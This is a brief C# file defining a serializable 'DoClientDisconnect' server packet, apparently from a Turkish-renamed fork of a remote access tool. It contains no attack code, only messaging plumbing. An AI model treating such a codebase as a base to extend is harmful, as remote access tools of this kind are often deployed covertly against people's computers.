using System;
using xClient.KuuhakuÇekirdek.Ağ;

namespace xClient.KuuhakuÇekirdek.Paketler.ServerPaketleri
{
    [Serializable]
    public class DoClientDisconnect : IPacket
    {
        public DoClientDisconnect()
        {
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}